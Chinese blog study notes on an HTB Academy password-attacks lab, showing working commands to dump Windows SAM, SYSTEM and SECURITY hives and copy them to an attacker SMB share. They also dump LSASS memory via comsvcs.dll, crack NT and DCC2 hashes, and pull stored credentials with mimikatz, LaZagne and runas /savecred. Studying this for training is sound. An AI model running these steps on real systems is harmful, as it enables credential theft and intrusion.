# htb academy笔记-module-Password Attacks（四）

> 原创 已于 2025-11-27 15:17:39 修改 · 公开 · 889 阅读 · 23 · 21 · CC 4.0 BY-SA版权 版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
> 文章链接：https://blog.csdn.net/weixin_51439723/article/details/154847678

上一篇： [htb academy笔记-module-Password Attacks（三）](https://blog.csdn.net/weixin_51439723/article/details/153312795) 

##  **一、Attacking SAM, SYSTEM, and SECURITY** 

###  **1. Registry hives** 

如果我们有administrator的权限，有三种registry hives可以直接拉出来：

- HKLM\SAM:有本地用户账户密码的hashes，可以提取出来crack成明文

- HKLM\SYSTEM:有用来加密SAM数据库的系统启动key。解密hash需要这个key

- HKLM\SECURITY:有LSA的敏感信息，包括cach中的domain credentials(DCC2)、明文密码、DPAPI kyes等

**A. 用reg.exe来备份上述hives** 

以administractive权限打开cmd：

<span style="color:#565a6e">reg</span><span style="color:#343b58">.</span><span style="color:#565a6e">exe save hklm\sam c</span><span style="color:#343b58">:</span><span style="color:#565a6e">\sam</span><span style="color:#343b58">.</span><span style="color:#565a6e">save</span>

<span style="color:#565a6e">reg</span><span style="color:#343b58">.</span><span style="color:#565a6e">exe save hklm\system c</span><span style="color:#343b58">:</span><span style="color:#565a6e">\system</span><span style="color:#343b58">.</span><span style="color:#565a6e">save</span>

<span style="color:#565a6e">reg</span><span style="color:#343b58">.</span><span style="color:#565a6e">exe save hklm\security c</span><span style="color:#343b58">:</span><span style="color:#565a6e">\security</span><span style="color:#343b58">.</span><span style="color:#565a6e">save</span>




####  **B. 转移：smbserver建一个share** 

用如下命令：

<span style="color:#565a6e">sudo python3</span><span style="color:#343b58">/</span><span style="color:#565a6e">usr</span><span style="color:#343b58">/</span><span style="color:#565a6e">share</span><span style="color:#343b58">/</span><span style="color:#565a6e">doc</span><span style="color:#343b58">/</span><span style="color:#565a6e">python3</span><span style="color:#343b58">-</span><span style="color:#565a6e">impacket</span><span style="color:#343b58">/</span><span style="color:#565a6e">examples</span><span style="color:#343b58">/</span><span style="color:#565a6e">smbserver</span><span style="color:#343b58">.</span><span style="color:#565a6e">py</span><span style="color:#343b58">-</span><span style="color:#565a6e">smb2support</span><span style="color:#34548a">CompData</span><span style="color:#343b58">/</span><span style="color:#565a6e">home</span><span style="color:#343b58">/</span><span style="color:#565a6e">ltnbob</span><span style="color:#343b58">/</span><span style="color:#34548a">Documents</span><span style="color:#343b58">/</span>


其中-smb2support是为了同时也支持新版smb，有些新版windows只支持这个； CompData是我们指定的share名字，后面跟着的是hives即将储存的路径。



####  **C. 执行转移** 

<span style="color:#565a6e">move sam</span><span style="color:#343b58">.</span><span style="color:#565a6e">save \\</span><span style="color:#343b58">[</span><span style="color:#565a6e">myip</span><span style="color:#343b58">]</span><span style="color:#565a6e">\CompData</span>

###  **2. 用secretsdump 拿hashes** 

<span style="color:#565a6e">python3</span><span style="color:#343b58">/</span><span style="color:#565a6e">usr</span><span style="color:#343b58">/</span><span style="color:#565a6e">share</span><span style="color:#343b58">/</span><span style="color:#565a6e">doc</span><span style="color:#343b58">/</span><span style="color:#565a6e">python3</span><span style="color:#343b58">-</span><span style="color:#565a6e">impacket</span><span style="color:#343b58">/</span><span style="color:#565a6e">examples</span><span style="color:#343b58">/</span><span style="color:#565a6e">secretsdump</span><span style="color:#343b58">.</span><span style="color:#565a6e">py</span><span style="color:#343b58">-</span><span style="color:#565a6e">sam sam</span><span style="color:#343b58">.</span><span style="color:#565a6e">save</span><span style="color:#343b58">-</span><span style="color:#565a6e">security security</span><span style="color:#343b58">.</span><span style="color:#565a6e">save</span><span style="color:#343b58">-</span><span style="color:#565a6e">system system</span><span style="color:#343b58">.</span><span style="color:#565a6e">save LOCAL</span>

<span style="background-color:#d5d6db"></span>


其中LOCAL表示这个拿hash的过程不联网

 <img src="./assets/16_1.png" alt="" style="max-height:490px; box-sizing:content-box;" />

可以看出拿到了本地SAMhashes、cached域名logon信息、LSA secrets如user key for DPAPI



<span style="color:#34548a">Dumping</span><span style="color:#5a4a78">local</span><span style="color:#565a6e">SAM hashes</span><span style="color:#343b58">(</span><span style="color:#565a6e">uid</span><span style="color:#343b58">:</span><span style="color:#565a6e">rid</span><span style="color:#343b58">:</span><span style="color:#565a6e">lmhash</span><span style="color:#343b58">:</span><span style="color:#565a6e">nthash</span><span style="color:#343b58">)</span>


这行说明了下面hash的格式，大部门现代系统用nthash，老的电脑如win Vista、win server2008用lm hash，这种更容易crack

###  **3. 用hashcat来crack hash** 

先把上述hash提出来放到文件里：

 <img src="./assets/16_2.png" alt="" style="max-height:174px; box-sizing:content-box;" />

然后

<span style="color:#565a6e">sudo hashcat</span><span style="color:#343b58">-</span><span style="color:#565a6e">m</span><span style="color:#485e30">1000</span><span style="color:#565a6e">hashestocrack</span><span style="color:#343b58">.</span><span style="color:#565a6e">txt</span><span style="color:#343b58">/</span><span style="color:#565a6e">usr</span><span style="color:#343b58">/</span><span style="color:#565a6e">share</span><span style="color:#343b58">/</span><span style="color:#565a6e">wordlists</span><span style="color:#343b58">/</span><span style="color:#565a6e">rockyou</span><span style="color:#343b58">.</span><span style="color:#565a6e">txt</span>

<span style="background-color:#d5d6db"></span>


其中-m 1000就是NT hash。结果：

 <img src="./assets/16_3.png" alt="" style="max-height:356px; box-sizing:content-box;" />

可以看到四个里面crack到了三个

###  **4. DCC2 hashes** 

hklm\security包含的cached域名登录信息中，有一种为DCC2 hashes，这是网络credential的本地copy，长这样：

<span style="color:#565a6e">inlanefreight</span><span style="color:#343b58">.</span><span style="color:#5a4a78">local</span><span style="color:#343b58">/</span><span style="color:#34548a">Administrator</span><span style="color:#343b58">:</span><span style="color:#565a6e">$DCC2$10240</span><span style="color:#485e30">#administrator#23d97555681813db79b2ade4b4a6ff25</span>

<span style="background-color:#d5d6db"></span>


crack:

<span style="color:#565a6e">hashcat</span><span style="color:#343b58">-</span><span style="color:#565a6e">m</span><span style="color:#485e30">2100</span><span style="color:#34548a">'$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25'</span><span style="color:#343b58">/</span><span style="color:#565a6e">usr</span><span style="color:#343b58">/</span><span style="color:#565a6e">share</span><span style="color:#343b58">/</span><span style="color:#565a6e">wordlists</span><span style="color:#343b58">/</span><span style="color:#565a6e">rockyou</span><span style="color:#343b58">.</span><span style="color:#565a6e">txt</span>

<span style="background-color:#d5d6db"></span>


 <img src="./assets/16_4.png" alt="" style="max-height:281px; box-sizing:content-box;" />

-m是2100。



这种比NT hashed难crack，因为使用PBKDF2。可以看到speed是5536 H/s.在同一台常规机器NT hash的crack速度可以到4605.4 kH/s，要慢800倍。所以是强密码的话短时间内crack不出来。

###  **5. DPAPI** 

即Data Protection API, 是微软里用来加解密数据的一系列APIs，被自己以及第三方使用：

- IE: 加解密网站上自动保存的账号和密码

- chrome：同上

- outlook：加解密账户的密码

- Remote Desktop Connection：加解密远程连接用的credetials

- Credential Manager：加解密访问共享资源、连wifi、VPN的credentials等。

被其加密的信息可以用内置的根据dpapi, mimikatz手动解密，或远程用DonPAPI:

 <img src="./assets/16_5.png" alt="" style="max-height:255px; box-sizing:content-box;" />

### 6. **远程dumping&LSA Secret的注意事项** 

####  **A. LSA Secret** 

有administration密码后我们能实现获得LSA secrets（即进行一些网络服务、计划的tasks时需要的credentials等信息）。

<span style="color:#565a6e">netexec smb</span><span style="color:#485e30">10.129</span><span style="color:#343b58">.</span><span style="color:#485e30">42.198</span><span style="color:#343b58">--</span><span style="color:#5a4a78">local</span><span style="color:#343b58">-</span><span style="color:#565a6e">auth</span><span style="color:#343b58">-</span><span style="color:#565a6e">u bob</span><span style="color:#343b58">-</span><span style="color:#565a6e">p HTB_@cademy_stdnt</span><span style="color:#343b58">!</span><span style="color:#343b58">--</span><span style="color:#565a6e">lsa</span>

<span style="background-color:#d5d6db"></span>


 <img src="./assets/16_6.png" alt="" style="max-height:200px; box-sizing:content-box;" />

####  **B. 远程dump SAM** 

同上：

 <img src="./assets/16_7.png" alt="" style="max-height:254px; box-sizing:content-box;" />

##  **二、Attacking LSASS** 

LSASS是执行安全policy、用户auth、把一些敏感credentials存储在memory里的核心进程：

 <img src="./assets/16_8.png" alt="" style="max-height:388px; box-sizing:content-box;" />

在上述logon的过程中，LSASS会：

- 把credentials cache到memory里

- 生成访问tokens

- 执行安全policies

- 写入安全日志

###  **1. dump LSASS的进程memory** 

我们也优先把相关memory先提取出来然后再crack，这样风险低、可操作。方法有很多，这里我们用windows内置工具进行。

####  **A. 任务管理器** 

能图形化交互时打开任务管理器，然后：

 <img src="./assets/16_9.png" alt="" style="max-height:428px; box-sizing:content-box;" />

找到LSA Process右键create dump file，会在%tmp%里生成lsass.dump。然后用上章的方法传出来



####  **B. Rundll32.exe & Comsvcs.dll** 

rundll32.exe是命令行工具，需要注意的是很多anti-virus会检测这个行为。

再这之前，必须先找到LSASS的PID



####  **C. 用cmd找LSASS的PID** 

<span style="color:#565a6e">tasklist</span><span style="color:#343b58">/</span><span style="color:#565a6e">svc</span>


 <img src="./assets/16_10.png" alt="" style="max-height:362px; box-sizing:content-box;" />

672



####  **D. 用PowerShell找LSASS的PID** 

<span style="color:#34548a">Get</span><span style="color:#343b58">-</span><span style="color:#34548a">Process</span><span style="color:#565a6e">lsass</span>


 <img src="./assets/16_11.png" alt="" style="max-height:114px; box-sizing:content-box;" />

672



####  **E. 用PowerShell生成dump文件** 

<span style="color:#565a6e">rundll32 C</span><span style="color:#343b58">:</span><span style="color:#565a6e">\windows\system32\comsvcs</span><span style="color:#343b58">.</span><span style="color:#565a6e">dll</span><span style="color:#343b58">,</span><span style="color:#34548a">MiniDump</span><span style="color:#485e30">672</span><span style="color:#565a6e">C</span><span style="color:#343b58">:</span><span style="color:#565a6e">\lsass</span><span style="color:#343b58">.</span><span style="color:#565a6e">dmp full</span>


运行rundll32.exe来调用外部的comsvcs.dll函数，然后调用MiiDump功能来dump这个进程的memory



###  **2. 用Pypykatz提取credentials** 

<span style="color:#565a6e">pypykatz lsa minidump</span><span style="color:#343b58">/</span><span style="color:#565a6e">home</span><span style="color:#343b58">/</span><span style="color:#565a6e">peter</span><span style="color:#343b58">/</span><span style="color:#34548a">Documents</span><span style="color:#343b58">/</span><span style="color:#565a6e">lsass</span><span style="color:#343b58">.</span><span style="color:#565a6e">dmp</span>


其中minidump是指明前面命令的数据来源

运行后会输出

####  **A. MSV** 

 <img src="./assets/16_12.png" alt="" style="max-height:189px; box-sizing:content-box;" />

MSV是LSA调用，用来和SAM数据库比对logon密码的auth pack。包含SID、用户名、域名、对应密码的NT&sha1 hash。

####  **B. WDIGEST** 

 <img src="./assets/16_13.png" alt="" style="max-height:137px; box-sizing:content-box;" />

是win xp-8&WinServer 2008-2012使用的老式auth协议，此时LSASS 以明文cache credentials，能直接查看。所以处于安全考虑现代os默认禁用，一些没有默认禁用的在更新系统后也可能禁用

####  **C. Kerberos** 

 <img src="./assets/16_14.png" alt="" style="max-height:74px; box-sizing:content-box;" />

Kerberos是windows域名环境中AD用的auth协议。

域中的每个account会给一个AD中的ticket，kerberos根据这些ticket来决定他们能在共享share中访问什么资源，就不用每次都输credentials。LSASS会caches和kerberos相关的密码、ekes、tickets和pins，所以若能从中提取则可以访问用域中的其他系统。

####  **D. DPAPI** 

 <img src="./assets/16_15.png" alt="" style="max-height:139px; box-sizing:content-box;" />

Mimikatz和Pypykatz可以提取出logon用户数据在该memory里的DPAPI masterkey，可以用来解密secret(因为该用户的application使用了DPAPI)，然后获取不同账号的credentials

##  **三、Attacking Windows Credential Manager** 

###  **1. Windows Vault and Credential Manager** 

Credential Manager是自从win server 2008 R2/win7后有的内置功能，credentials在以下路径加密保存：

<span style="color:#343b58">%</span><span style="color:#34548a">UserProfile</span><span style="color:#343b58">%</span><span style="color:#565a6e">\AppData\Local\Microsoft\Vault\</span>

<span style="color:#343b58">%</span><span style="color:#34548a">UserProfile</span><span style="color:#343b58">%</span><span style="color:#565a6e">\AppData\Local\Microsoft\Credentials\</span>

<span style="color:#343b58">%</span><span style="color:#34548a">UserProfile</span><span style="color:#343b58">%</span><span style="color:#565a6e">\AppData\Roaming\Microsoft\Vault\</span>

<span style="color:#343b58">%</span><span style="color:#34548a">ProgramData</span><span style="color:#343b58">%</span><span style="color:#565a6e">\Microsoft\Vault\</span>

<span style="color:#343b58">%</span><span style="color:#34548a">SystemRoot</span><span style="color:#343b58">%</span><span style="color:#565a6e">\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</span>


每个vault文件夹都有一个policy.vpol文件，其中有被DPAPI保护的AES keys，这些keys用来加密credentials。更新版本的windows用Credential Guard把他们保存在secured memory enclaves来进一步保护。

微软把被保护的stores(存储区)叫Credential Lockers(正式一点叫Windows Vaults)。Credential Manager只是一个API，真正加密的stores是locker的文件夹，有两种：

- Web Credentials: web相关的，该locker被IE或Edge使用

- Windows Credentials：针对如Onedirve, 域名用户，本地资源、服务等的credentials

 <img src="./assets/16_16.png" alt="" style="max-height:390px; box-sizing:content-box;" />

通过控制面板或下面的cmd命令来把Windows Vaults转换成.crd是可行的:

<span style="color:#565a6e">rundll32 keymgr</span><span style="color:#343b58">.</span><span style="color:#565a6e">dll</span><span style="color:#343b58">,</span><span style="color:#34548a">KRShowKeyMgr</span>


 <img src="./assets/16_17.png" alt="" style="max-height:396px; box-sizing:content-box;" />

这里的备份需要user自己提供密钥，然后可在其他win系统上导入

###  **2. 用cmdkey列举credentials** 

<span style="color:#565a6e">cmdkey</span><span style="color:#343b58">/</span><span style="color:#565a6e">list</span>


 <img src="./assets/16_18.png" alt="" style="max-height:448px; box-sizing:content-box;" />

·   target: 这个credential用在哪

- type: Generic就是平平无奇的类型

- Persistence：标识是否在电脑上一直保存，标了Local machine persistence的在重启后还存在

第一个entry可以看到用户id乱起的，这种是内部账户没太多利用价值。

第二个entry是SRV01\mcharles的credential，遇到这种我们可以直接：

<span style="color:#565a6e">runas</span><span style="color:#343b58">/</span><span style="color:#565a6e">savecred</span><span style="color:#343b58">/</span><span style="color:#565a6e">user</span><span style="color:#343b58">:</span><span style="color:#565a6e">SRV01\mcharles cmd</span>


 <img src="./assets/16_19.png" alt="" style="max-height:76px; box-sizing:content-box;" />

 <img src="./assets/16_20.png" alt="" style="max-height:186px; box-sizing:content-box;" />

###  **3. 用mimikatz提取credentials** 

这里我们用它的sekurlsa功能

<span style="color:#565a6e">mimikatz</span><span style="color:#343b58">.</span><span style="color:#565a6e">exe</span>

<span style="color:#565a6e">privilege</span><span style="color:#343b58">::</span><span style="color:#565a6e">debug</span>

<span style="color:#565a6e">sekurlsa</span><span style="color:#343b58">::</span><span style="color:#565a6e">credman</span>


 <img src="./assets/16_21.png" alt="" style="max-height:636px; box-sizing:content-box;" />

###  **4. exercise** 

靶机里面没有工具，这里我们用xfreerdp连接时可以同时建立一个本地和远端的共享文件夹：

<span style="color:#565a6e">xfreerdp3</span><span style="color:#343b58">/</span><span style="color:#565a6e">v</span><span style="color:#343b58">:</span><span style="color:#485e30">10.129</span><span style="color:#343b58">.</span><span style="color:#485e30">234.171</span><span style="color:#343b58">/</span><span style="color:#565a6e">u</span><span style="color:#343b58">:</span><span style="color:#565a6e">sadams</span><span style="color:#343b58">/</span><span style="color:#565a6e">p</span><span style="color:#343b58">:</span><span style="color:#565a6e">totally2brow2harmon@</span><span style="color:#343b58">/</span><span style="color:#565a6e">drive</span><span style="color:#343b58">:</span><span style="color:#565a6e">share</span><span style="color:#343b58">,</span><span style="color:#565a6e">[local path]</span>


进去后可以在windows里看到这个文件夹并穿工具：

 <img src="./assets/16_22.png" alt="" style="max-height:370px; box-sizing:content-box;" />

一开始穿前文中的mimikatz，但是运行后发现这个需要管理员权限才能提取到密码，所以我们换成LaZagne，这个对权限要求小很多：

<span style="color:#343b58">LaZagne.exe all</span>

发现还没有出来，于是用前面的

<span style="color:#565a6e">runas</span><span style="color:#343b58">/</span><span style="color:#565a6e">savecred</span><span style="color:#343b58">/</span><span style="color:#565a6e">user</span><span style="color:#343b58">:</span><span style="color:#565a6e">SRV01\mcharles cmd</span>

转到另一个账号后，在运行，密码出来了。